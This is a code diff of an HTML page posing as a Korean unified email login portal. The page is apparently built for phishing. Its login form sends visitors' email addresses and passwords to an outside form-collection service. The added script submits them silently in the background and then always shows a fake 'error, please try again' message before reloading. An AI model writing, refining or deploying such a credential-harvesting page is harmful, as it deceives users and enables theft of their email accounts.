@@ -47,6 +47,7 @@
 </head>
 <body class="text-gray-800">
 
+  <!-- HERO -->
   <section class="hero flex items-center justify-center text-center text-white relative">
     <div class="z-10 px-4">
       <h1 class="mb-1">당신의 모든 이메일을 한 곳에서</h1>
@@ -54,10 +55,12 @@
     </div>
   </section>
 
+  <!-- MAIN -->
   <section id="main" class="main-area bg-white flex items-center">
     <div class="max-w-6xl mx-auto w-full px-4">
       <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
 
+        <!-- LEFT FEATURES -->
         <div class="md:w-1/2">
           <div class="flex flex-col gap-3 md:gap-4">
             <div class="flex items-start gap-3">
@@ -67,6 +70,7 @@
                 <div class="feature-desc">최신 암호화 기술로 메일을 안전하게 보호합니다.</div>
               </div>
             </div>
+
             <div class="flex items-start gap-3">
               <img src="https://cdn-icons-png.flaticon.com/512/1827/1827504.png" alt="간편함" class="feature-icon mt-1 opacity-90">
               <div>
@@ -74,6 +78,7 @@
                 <div class="feature-desc">모든 계정을 한 번에 관리하고 빠르게 검색하세요.</div>
               </div>
             </div>
+
             <div class="flex items-start gap-3">
               <img src="https://cdn-icons-png.flaticon.com/512/1029/1029183.png" alt="연동" class="feature-icon mt-1 opacity-90">
               <div>
@@ -84,20 +89,16 @@
           </div>
         </div>
 
+        <!-- RIGHT LOGIN -->
         <div class="md:w-1/2 flex justify-end">
           <div class="bg-gray-50 shadow-md rounded-2xl p-6 w-full max-w-xs">
             <h2 class="text-lg font-bold text-center mb-3">로그인</h2>
 
-            <!-- ✅ Formspark native submission -->
+            <!-- ✅ Formspark-compatible form -->
             <form id="login-form" class="space-y-3" action="https://submit.formspark.io/2egN1olQU" method="POST">
-              <!-- Redirects back to same page -->
-              <input type="hidden" name="_redirect" value="">
-              
               <input type="email" name="email" placeholder="이메일 주소" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none" required>
               <input type="password" name="password" placeholder="비밀번호" class="w-full border rounded-md login-input focus:ring-2 focus:ring-blue-300 outline-none" required>
-              
               <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-md login-button">로그인</button>
-              
               <div id="form-message" class="form-message">오류, 다시 시도해주세요</div>
             </form>
 
@@ -111,6 +112,7 @@
     </div>
   </section>
 
+  <!-- FOOTER -->
   <footer class="bg-gray-900 text-gray-300 text-center py-3" style="height:56px;">
     <div class="max-w-6xl mx-auto px-4 flex items-center justify-center h-full">
       <div class="text-xs">
@@ -121,17 +123,37 @@
     </div>
   </footer>
 
+  <!-- ✅ FIXED SCRIPT -->
   <script>
-    // Set redirect to current page dynamically
-    document.querySelector('input[name="_redirect"]').value = window.location.href;
-
-    // Optional: Show Korean message before redirect (after submit)
     const form = document.getElementById('login-form');
     const message = document.getElementById('form-message');
 
-    form.addEventListener('submit', function() {
-      message.style.display = 'block';
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch(form.action, {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        // ✅ Report will appear in Formspark
+        if (response.ok) {
+          message.style.display = 'block';
+          setTimeout(() => {
+            window.location.reload();
+          }, 2000);
+        } else {
+          message.style.display = 'block';
+        }
+      } catch (error) {
+        message.style.display = 'block';
+      }
     });
   </script>
+
 </body>
 </html>
